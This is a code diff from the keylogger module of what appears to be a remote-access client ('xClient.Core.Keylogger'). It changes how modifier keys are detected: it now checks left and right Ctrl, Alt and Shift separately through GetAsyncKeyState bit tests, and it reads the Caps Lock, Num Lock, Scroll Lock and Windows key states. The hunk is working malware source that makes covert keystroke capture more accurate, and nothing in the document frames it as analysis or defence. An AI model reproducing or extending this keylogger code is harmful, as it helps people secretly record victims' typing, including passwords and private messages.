@@ -57,16 +57,23 @@ namespace xClient.Core.Keylogger
             ModifierKeys = new KeyloggerModifierKeys()
             {
                 // Modifier keys that are pressed:
-                CtrlKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CONTROL).IsKeyPressed(),
-                AltKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_MENU).IsKeyPressed(),
-                ShiftKeyPressed = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SHIFT).IsKeyPressed(),
+                CtrlKeyPressed =
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_LCONTROL).GetHighestBit() ||
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_RCONTROL).GetHighestBit(),
+                AltKeyPressed =
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_LMENU).GetHighestBit() ||
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_RMENU).GetHighestBit(),
+                ShiftKeyPressed =
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_LSHIFT).GetHighestBit() ||
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_RSHIFT).GetHighestBit(),
+
                 // Modifier keys that have a state (toggle 'on' or 'off').
-                CapsLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CAPITAL).IsKeyToggled(),
-                NumLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_NUMLOCK).IsKeyToggled(),
-                ScrollLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SCROLL).IsKeyToggled(),
-                WindowsKeyPressed = 
-                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_LWIN).IsKeyToggled() ||
-                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_RWIN).IsKeyToggled()
+                CapsLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_CAPITAL).GetLowestBit(),
+                NumLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_NUMLOCK).GetLowestBit(),
+                ScrollLock = Win32.GetAsyncKeyState(KeyloggerKeys.VK_SCROLL).GetLowestBit(),
+                WindowsKeyPressed =
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_LWIN).GetLowestBit() ||
+                    Win32.GetAsyncKeyState(KeyloggerKeys.VK_RWIN).GetLowestBit()
             };
 
             // To avoid having to repeatedly check if one of the modifier
